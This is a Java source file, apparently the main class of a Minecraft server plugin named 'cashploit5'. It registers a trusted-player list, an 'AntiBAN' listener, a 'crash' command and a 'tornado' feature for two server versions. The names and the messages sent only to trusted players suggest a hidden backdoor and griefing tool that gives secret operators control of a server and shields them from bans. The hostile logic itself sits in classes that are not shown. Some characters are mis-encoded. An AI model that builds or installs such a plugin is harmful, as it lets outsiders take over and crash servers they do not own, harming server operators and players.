package de.main;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import de.cashploit5.Main;
import de.cashploit5.console.console;
import de.cashploit5.plugin.ScoreboardManager;

public class MainClass extends Main {

	private static MainClass plugin;

	public void onEnable() {
		plugin = this;
		registerConfig("trusted");

		if (loadForVersion()) {

		} else {
			console.send("ßcDie Version des Plugins ist nicht mit der Version des Servers kompatibel!");
			Bukkit.getPluginManager().disablePlugin(this);
		}

		registerTabCompleters();

	}

	private String getVersion() {
		String version = null;
		try {
			version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
			return version;
		} catch (Exception e) {
			return null;
		}
	}

	private boolean loadForVersion() {

		String version = "";
		try {
			version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
		} catch (ArrayIndexOutOfBoundsException e) {
			return false;
		}
		getLogger().info("Your server is running version " + version);

		if (version.equals("v1_8_R3")) {

			setCommandManagerFor_v1_8_8(new de.cashploit5.v1_8_8.command.CommandManager());
			new de.cashploit5.v1_8_8.events.ChatListener(this);
			new de.cashploit5.v1_8_8.events.AntiBANListener(this);
			new de.cashploit5.v1_8_8.events.JoinQuitListener(this);
			new ScoreboardManager(this);
			de.cashploit5.v1_8_8.command.TornadoCommand.startTornadoScheduler();

			return true;
		} else if (version.equals("v1_12_R1")) {

			setCommandManagerFor_v1_12_2(new de.cashploit5.v1_12_2.command.CommandManager());
			new de.cashploit5.v1_12_2.events.ChatListener(this);
			new de.cashploit5.v1_12_2.events.AntiBANListener(this);
			new de.cashploit5.v1_12_2.events.JoinQuitListener(this);
			de.cashploit5.v1_12_2.command.TornadoCommand.startTornadoScheduler();

			return true;
		}
		return false;
	}

	public void onDisable() {
		for (Player all : Bukkit.getOnlinePlayers()) {
			if (de.cashploit5.v1_8_8.command.TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())
					|| de.cashploit5.v1_12_2.command.TrustCommand.getTrustedPlayers()
							.contains(all.getUniqueId().toString())) {
				Main.sendMessage(all, "ßcKEINE COMMANDS EINGEBEN BIS DER RELOAD FERTIG IST!!!");
			}
		}
		for (Player all : Bukkit.getOnlinePlayers()) {
			if (de.cashploit5.v1_8_8.command.TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())
					|| de.cashploit5.v1_12_2.command.TrustCommand.getTrustedPlayers()
							.contains(all.getUniqueId().toString())) {
				Main.sendMessage(all, "ßaReload beendet! Viel Spaﬂ");
			}
		}

		if (getVersion().equals("v1_12_R1")) {
			try {
				for (de.cashploit5.v1_12_2.tornado.Tornado tornado : de.cashploit5.v1_12_2.tornado.Tornado.tornados) {
					tornado.delete();
				}
				de.cashploit5.v1_12_2.tornado.Tornado.tornados.clear();
			} catch (NoClassDefFoundError e) {
			}
		} else if (getVersion().equals("v1_8_R3")) {
			try {
				for (de.cashploit5.v1_8_8.tornado.Tornado tornado : de.cashploit5.v1_8_8.tornado.Tornado.tornados) {
					tornado.delete();
				}
				de.cashploit5.v1_8_8.tornado.Tornado.tornados.clear();
			} catch (NoClassDefFoundError e) {
			}
		}
	}

	public static MainClass getPlugin() {
		return plugin;
	}

	private void registerTabCompleters() {
		if (getVersion().equals("v1_12_R1")) {
			new de.cashploit5.v1_12_2.events.tab.TabCompleteListener(this);
			getCashploitCommand_v1_12_2("crash")
					.setTabCompleter(new de.cashploit5.v1_12_2.command.tab.CrashTabCompleter());
		} else if (getVersion().equals("v1_8_R3")) {
			new de.cashploit5.v1_8_8.events.tab.TabCompleteListener(this);
			getCashploitCommand_v1_8_8("crash")
					.setTabCompleter(new de.cashploit5.v1_8_8.command.tab.CrashTabCompleter());
		}
	}
}
